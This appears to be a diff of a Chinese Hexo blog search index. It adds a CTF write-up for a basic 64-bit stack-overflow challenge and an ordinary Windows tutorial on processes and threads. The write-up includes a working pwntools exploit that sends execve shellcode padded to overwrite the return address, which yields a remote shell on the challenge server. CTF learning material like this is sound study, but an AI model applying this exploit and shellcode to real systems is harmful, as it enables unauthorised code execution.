@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[实验吧piolt(栈溢出)Writeup]]></title>
+    <url>%2F2018%2F09%2F28%2F%E5%AE%9E%E9%AA%8C%E5%90%A7piolt%E6%A0%88%E6%BA%A2%E5%87%BAWriteup%2F</url>
+    <content type="text"><![CDATA[前言最近闲来无事，准备开始学习一波pwn，先从最基本的栈溢出开始学起，在实验吧中找了一道基础的栈溢出题目做了做，收获颇多。 解题思路根据题目要求，nc连接远程服务器 发现一些文字，以及一个Location的地址，还有一个可以输入的Command命令，随便输入一个ls告诉我任务失败。同时还给了一个附件，是这个程序的可执行文件，先利用file命令查看文件的格式是一个64位的程序，然后在checksec看一下有什么防护emmmm,什么防护也没有，很好。直接放入IDA中，找到main函数，F5进行反汇编。 通过阅读代码，发现了read函数存在栈溢出。程序在最开始的时候生命了buf数组，大小为0x20，也就是32，在执行read函数的时候，读取了0x40，也就是64位，很明显的栈溢出。 其中给了一个Location，发现是buf的地址，那么情况就很明了了，我们可以在buf区开始写shellcode，然后利用padding覆盖到返回地址，在返回地址的地方写上这个buf的地址，这样程序在返回的时候就可以返回到buf的地址，从而执行我们写的shellcode了。 由代码我们知道，buf的长度是0x20，也就是32字节，这个是64位的程序，也就是说1粒度是8个字节，那么buf是局部变量，栈上紧跟着是调用者的ebp（32-40），之后就是返回地址了（40-48），因此我们只要确保40之后是那个buf的地址就好了 Payload1234567891011121314from pwn import *context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)r = remote(&apos;106.2.25.7&apos;, &apos;8003&apos;)r.recvuntil(&apos;Location:&apos;)l = int(r.recvuntil(&apos;\n&apos;)[:-1], 16)shellcode = &quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;print disasm(shellcode)payload = shellcode + (40 - len(shellcode)) * &apos;A&apos; + p64(l)print len(shellcode)r.recvuntil(&quot;Command:&quot;)r.sendline(payload)r.interactive() 得到shell后，进入/home目录，得到flag]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>Pwn</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Windows编程之进程与线程]]></title>
     <url>%2F2018%2F09%2F28%2FWindows%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B%2F</url>
     <content type="text"><![CDATA[Windows编程之进程现在的Windows操作系统实行的是抢占式多任务的调度方式，意思是操作系统在执行多任务的时候会按照优先级对任务进行排序，重要的任务先执行，但是并不会一直霸占cpu，而是在执行一段时间后操作系统会收回其运行的权利，把它排到后面，然后让其他的任务进行执行，每次执行的任务的时间其实是特别少的，那么对于任务来说，相当于同时在执行所有的任务。 进程这一部分，我们的代码展示了如果获取系统的进程列表，以及删除进程。 代码之进程123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;string.h&gt;int main(int argc, char* argv[]) &#123; HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hProcessSnap == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateToolhelp32Snapshot error\n&quot;); return 0; &#125; PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); char buff[1024]; BOOL bProcess = Process32First(hProcessSnap, &amp;pe32); DWORD sogoupid; while (bProcess) &#123; wsprintf(buff, &quot;%40s ------------------- %6d\n&quot;, pe32.szExeFile, pe32.th32ProcessID); if (strcmp(pe32.szExeFile, &quot;SogouCloud.exe&quot;) == 0) &#123; sogoupid = pe32.th32ProcessID; &#125; printf(buff); memset(buff, 0x00, 1024); bProcess = Process32Next(hProcessSnap, &amp;pe32); &#125; CloseHandle(hProcessSnap); printf(&quot;SogouCloud&apos;s pid is %d\n&quot;, sogoupid); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, sogoupid); if (hProcess == NULL) &#123; printf(&quot;OpenProcess error\n&quot;); return 0; &#125; if (TerminateProcess(hProcess, 0)) &#123; printf(&quot;终止进程成功&quot;); &#125; CloseHandle(hProcess); return 0;&#125; 简单的分析一下这段代码，首先在写获取进程的代码之前要#include &lt;TlHelp32.h&gt;，在main函数中，首先利用CreateToolhelp32Snapshot函数来获取进程快照的句柄，该函数的第一个参数是获取进程的类型，我们选择TH32CS_SNAPPROCESS，来获取进程，第二个参数为0，代表获取系统的所有进程。 之后声明一个PROCESSENTRY32结构变量，该变量用于存取获取的进程的各种信息。 利用Process32First函数来取得第一个进程，之后用while循环配合Process32Next函数来获取所有的进程。我们用到的PROCESSENTRY32结构体中的szExeFile是进程的文件名，th32ProcessID是进程的pid。 在之后我们判断进程名是否是SogouCloud.exe来获取其pid，最后利用OpenProcess打开进程获取句柄，配合TerminateProcess函数结束进程。 Windows编程之多线程对于多线程，没啥好说的，主要是说一下代码中将要出现的临界区。在多线程中的有一个临界区的概念，意思是同一时间内，只能有一个线程访问临界区的资源，这样能够防止对于一个文件来说，多个线程同时修改的的问题。 代码之线程12345678910111213141516171819202122232425262728293031323334353637#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;HANDLE hFile;CRITICAL_SECTION cs;DWORD WINAPI Thread(LPVOID IpParam) &#123; int n = (int)IpParam; DWORD dwWrite; for (int i = 0; i &lt; 100; i++) &#123; EnterCriticalSection(&amp;cs); char Data[256] = &quot;Hello, my friend.\r\n&quot;; WriteFile(hFile, &amp;Data, strlen(Data), &amp;dwWrite, NULL); LeaveCriticalSection(&amp;cs); &#125; printf(&quot;第%d号线程结束运行\n&quot;, n); return 0;&#125;int main(int argc, char* argv[]) &#123; hFile = CreateFile(&quot;C:\\Users\\pino\\source\\repos\\new\\new\\hack.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;CreateFile error\n&quot;); return 0; &#125; HANDLE hThread[5]; DWORD dwThreadId; InitializeCriticalSection(&amp;cs); for (int i = 0; i &lt; 5; i++) &#123; hThread[i] = CreateThread(NULL, 0, Thread, (LPVOID)(i+1), 0, &amp;dwThreadId); printf(&quot;第%d号线程创建成功\n&quot;, i + 1); &#125; WaitForMultipleObjects(5, hThread, TRUE, INFINITE); DeleteCriticalSection(&amp;cs); CloseHandle(hFile); return 0;&#125; 代码中的临界区的实现需要先定义一个全局的CRITICAL_SECTION结构变量。然后是InitializeCriticalSection -&gt; EnterCriticalSection -&gt; LeaveCriticalSection -&gt; DeleteCriticalSection。 还有就是在定义线程函数的时候统一的格式DWORD WINAPI 函数名(LPVOID 参数)]]></content>
@@ -506,8 +518,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>小贴士</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -518,8 +530,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>小贴士</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -554,8 +566,8 @@
         <category>Linux</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
         <tag>小贴士</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -618,8 +630,8 @@
       </categories>
       <tags>
         <tag>提权</tag>
-        <tag>后渗透</tag>
         <tag>Linux</tag>
+        <tag>后渗透</tag>
       </tags>
   </entry>
   <entry>
